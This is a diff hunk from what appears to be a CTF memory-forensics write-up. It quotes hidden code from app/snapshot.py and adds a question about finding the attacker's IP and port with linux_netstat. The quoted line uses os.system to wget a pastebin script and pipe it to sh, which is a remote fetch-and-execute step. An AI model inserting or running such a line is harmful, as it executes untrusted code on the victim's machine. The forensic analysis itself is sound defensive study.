@@ -78,3 +78,11 @@ Looking at the repository in the file app/snapshot.py we can see that the conten
 os.system('wget -O - https://pastebin.com/raw/nQwMKjtZ 2>/dev/null|sh')
 ```
 Go to the url and you have the flag. 
+
+## [](#header-2) Q5 : What are the attacker's IP address and the local port on the targeted machine?
+
+To view the content of the current network exchanges at the time of the dump, the linux_netstat command exists.
+
+![12345 that some weird port](/assets/Q3-seized.png)
+
+12345 that some weird port. 
